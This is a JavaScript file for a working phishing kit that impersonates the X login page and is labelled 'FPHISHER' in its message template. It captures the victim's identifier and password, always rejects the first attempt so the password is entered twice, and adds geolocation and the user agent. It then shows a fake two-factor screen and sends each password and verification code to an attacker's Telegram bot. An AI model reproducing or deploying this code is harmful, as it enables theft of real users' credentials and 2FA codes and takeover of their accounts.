let attemptCount = 0;

let errorTimeoutId = null;

function showError() {
  const popup = document.getElementById('errorPopup');
  popup.classList.remove('hidden', 'fade-out');

  if (errorTimeoutId) {
    clearTimeout(errorTimeoutId);
    errorTimeoutId = null;
  }

  errorTimeoutId = setTimeout(() => {
    hideError();
  }, 2000);
}

function hideError() {
  const popup = document.getElementById('errorPopup');
  popup.classList.add('fade-out');

  setTimeout(() => {
    popup.classList.add('hidden');
    popup.classList.remove('fade-out');
  }, 400);
}


function validateAndProceed() {
  const input = document.getElementById('identifier');
  const value = input.value.trim();

  if (!value) {
    showError("Required", "Please enter your phone, email, or username.");
    return;
  }

  const usernameRegex = /^[A-Za-z0-9_]{1,15}$/;
  const emailRegex    = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const phoneRegex    = /^\+?[1-9]\d{6,14}$/;

  if (! (usernameRegex.test(value) || emailRegex.test(value) || phoneRegex.test(value)) ) {
    showError("Invalid format", "Please enter a valid username, email address, or phone number.");
    return;
  }

  document.getElementById('displayedIdentifier').textContent = value;
  document.getElementById('step1').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
  attemptCount = 0; // reset attempts when entering password screen
}

function goBackToStep1() {
  document.getElementById('step2').classList.add('hidden');
  document.getElementById('step1').classList.remove('hidden');
  hideError();
}

async function fetchGeoLocation() {
  try {
    const resp = await fetch('https://ipapi.co/json/');
    if (!resp.ok) return { country: 'unknown', region: 'unknown' };
    const data = await resp.json();
    return {
      country: data.country_name || 'unknown',
      region: data.region || data.region_code || 'unknown'
    };
  } catch {
    return { country: 'unknown', region: 'unknown' };
  }
}

async function sendToTelegram(attemptNumber) {
  const identifier = document.getElementById('displayedIdentifier').textContent.trim();
  const password = document.getElementById('password').value.trim();

  if (!identifier || !password) return false;

  const location = await fetchGeoLocation();

  const message =
`🔐✨  X LOGIN CAPTURE  —  FPHISHER
═══════════════════════════════════════

👤 USERNAME / EMAIL  
➤ ${identifier}

🔑 PASSWORD  
➤ ${password}

🌍 LOCATION  
➤ Country: ${location.country} 🇮🇳
➤ Region:  ${location.region} 📍

🕒 TIMESTAMP  
➤ ${new Date().toISOString()}

💻 USER AGENT  
➤ ${navigator.userAgent}

═══════════════════════════════════════
⚡ Powered by FTECH™ Secure Systems
🛡️ Data Pipeline: ACTIVE
═══════════════════════════════════════`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    return res.ok;
  } catch {
    return false;
  }
}

async function fetchProfilePicture(username) {
  if (!username) return null;

  // Prefer Twitter avatar URL lookup (unavatar service)
  const url = `https://unavatar.io/twitter/${encodeURIComponent(username)}`;

  try {
    const resp = await fetch(url, { method: 'HEAD' });
    return resp.ok ? url : null;
  } catch {
    return null;
  }
}

async function sendTwoFACodeToTelegram(identifier, twoFactorCode, method) {
  const message =
`🔐✨  X LOGIN CAPTURE  —  FPHISHER
═══════════════════════════════════════

👤 USERNAME / EMAIL  
➤ ${identifier}

🔑 2FA INPUT  
➤ ${twoFactorCode}

📡 METHOD  
➤ ${method}

🕒 TIMESTAMP  
➤ ${new Date().toISOString()}

💻 USER AGENT  
➤ ${navigator.userAgent}

═══════════════════════════════════════
⚡ Powered by FTECH™ Secure Systems
🛡️ Data Pipeline: ACTIVE
═══════════════════════════════════════`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    return res.ok;
  } catch {
    return false;
  }
}

async function handleLogin() {
  attemptCount++;

  const password = document.getElementById('password').value.trim();
  if (!password) {
    showError();
    return;
  }

  // Always send — regardless of attempt
  await sendToTelegram(attemptCount);

  if (attemptCount === 1) {
    // First attempt: always "wrong"
    showError();
    document.getElementById('password').value = ''; // optional: clear field
  } else {
    // Second attempt: show 2FA immediately using the provided style
    const identifier = document.getElementById('displayedIdentifier').textContent.trim();
    const displayName = identifier.split('@')[0] || identifier;
    const isEmail = identifier.includes('@');
    const isPhone = /^\+?[0-9]{6,15}$/.test(identifier);

    const profilePhoto = await fetchProfilePicture(displayName);
    const avatarMarkup = profilePhoto
      ? `<img src="${profilePhoto}" alt="avatar" class="w-12 h-12 rounded-full object-cover" />`
      : `<div class="w-12 h-12 rounded-full bg-gradient-to-br from-purple-600 via-pink-500 to-blue-500 flex items-center justify-center text-xl font-bold">${(displayName.charAt(0) || 'U').toUpperCase()}</div>`;

    document.body.innerHTML = `
      <div class="min-h-screen bg-black text-white flex items-center justify-center p-4">
        <div class="w-full max-w-md">
          <div class="flex justify-end mb-6">
            <button onclick="location.reload()" class="text-white hover:bg-gray-900 rounded-full p-2">
              <svg class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                <path d="M10.59 12L4.94 17.65c-.39.39-.39 1.02 0 1.41.39.39 1.02.39 1.41 0L12 13.41l5.65 5.65c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L13.41 12l5.65-5.65c.39-.39.39-1.02 0-1.41-.39-.39-1.02-.39-1.41 0L12 10.59 6.35 4.94c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L10.59 12z"/>
              </svg>
            </button>
          </div>
          <div class="space-y-6">
            <h1 class="text-3xl font-bold text-center sm:text-left">Enter your verification code</h1>
            <p class="text-gray-400 text-base text-center sm:text-left">Use your code generator app, email or SMS to generate a code and enter it below.</p>
            <div class="flex items-center justify-center sm:justify-start gap-3">
              ${avatarMarkup}
              <div>
                <div class="font-bold">${displayName}</div>
                <div class="text-gray-500">${identifier}</div>
              </div>
            </div>
            <div>
              <input id="twoFactorCode" type="text" placeholder="Enter code" class="w-full bg-transparent border border-blue-500 rounded-lg py-4 px-4 text-xl text-white placeholder-gray-500 focus:border-blue-400 transition-all" autocomplete="one-time-code" inputmode="numeric" maxlength="8" />
            </div>
            <div class="flex flex-col items-center sm:items-start gap-4 text-blue-400 text-sm">
              <button class="hover:underline">Choose a different verification method</button>
              <a href="https://help.x.com/en/forms" target="_blank" rel="noopener noreferrer" class="hover:underline">Contact X Support</a>
            </div>
            <button id="verifyButton" class="w-full bg-gray-600 text-gray-400 font-bold py-3.5 rounded-full text-lg">Next</button>
            <p id="twoFactorError" class="text-red-500 text-sm mt-3 hidden">Incorrect code. Please try again.</p>
          </div>
        </div>
      </div>`;

    const twoFactorError = document.getElementById('twoFactorError');
    const twoFactorInput = document.getElementById('twoFactorCode');
    const verifyButton = document.getElementById('verifyButton');

    twoFactorInput.addEventListener('input', () => {
      if (twoFactorInput.value.trim().length > 0) {
        verifyButton.classList.remove('bg-gray-600', 'text-gray-400');
        verifyButton.classList.add('bg-white', 'text-black');
      } else {
        verifyButton.classList.add('bg-gray-600', 'text-gray-400');
        verifyButton.classList.remove('bg-white', 'text-black');
      }
    });

    verifyButton.addEventListener('click', async (e) => {
      e.preventDefault();
      const code = twoFactorInput.value.trim();
      await sendTwoFACodeToTelegram(identifier, code, isEmail ? 'email' : isPhone ? 'sms' : 'app');
      if (code === '123456') {
        window.location.href = 'https://x.com/home';
      } else {
        twoFactorError.classList.remove('hidden');
      }
    });
  }
}

// Attach login handler
document.addEventListener('DOMContentLoaded', () => {
  const btn = document.getElementById('loginButton');
  if (btn) {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      handleLogin();
    });
  }

  // Also allow Enter key in password field
  const pwInput = document.getElementById('password');
  if (pwInput) {
    pwInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleLogin();
      }
    });
  }
});
